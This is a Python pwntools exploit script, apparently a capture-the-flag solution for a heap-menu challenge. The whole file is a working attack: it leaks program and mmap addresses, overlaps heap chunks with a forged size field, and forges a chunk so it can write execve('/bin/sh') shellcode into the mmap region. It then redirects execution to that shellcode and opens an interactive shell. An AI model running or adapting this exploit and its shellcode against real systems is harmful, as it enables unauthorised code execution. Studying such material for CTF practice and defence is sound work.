from parse_args_and_some_func import *

sh:tube = all_parsed_args['io']

def Allocate(size:int) -> int:
    sh.sendlineafter(">> ", "1")
    sh.sendlineafter("Size: ", str(size))
    sh.recvuntil("Pointer Address ")
    msg = sh.recvline()
    log.info("{}".format(msg))
    return int16(msg[:-1].decode())


def Delete(idx:int):
    sh.sendlineafter(">> ", "2")
    sh.sendlineafter("Index: ", str(idx))


def Fill(idx:int, content:(bytes, str)):
    sh.sendlineafter(">> ", "3")
    sh.sendlineafter("Index: ", str(idx))
    sh.sendafter("Content: ", content)

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# 
sh.recvuntil("Mmap: ")
msg = sh.recvline()
mmap_addr = int16(msg[:-1].decode())
LOG_ADDR("mmap_addr", mmap_addr)

program_base_addr = Allocate(0x410) - 0x202068 # 0
LOG_ADDR("program_base_addr", program_base_addr)

Allocate(0x28) # 1
Allocate(0x18) # 2
Allocate(0x4f0) # 3
Allocate(0x10) # 4
# 
Delete(0)
STOP()
Fill(2, 0x10 * b'a' + p64(0x470))
STOP()
Delete(3)
STOP()
Delete(1)
Delete(2)

Allocate(0x440) # 0

Allocate(0x510) # 1
STOP()

payload = b'a' * 0x410 + p64(0) + p64(0x31) + p64(mmap_addr + 0x10) 
Fill(0, payload + b'\n')
Allocate(0x28) # 2
Allocate(0x28) # 3

Fill(3, shellcode + b'\n')

Fill(1, '\x30\n')
Allocate(0x18) # 5
Allocate(0x18) # 6

Fill(6, p64(mmap_addr + 0x10) + b'\n')

STOP()

sh.sendlineafter(">> ", "1")
sh.sendlineafter("Size: ", str(16))

sh.interactive()
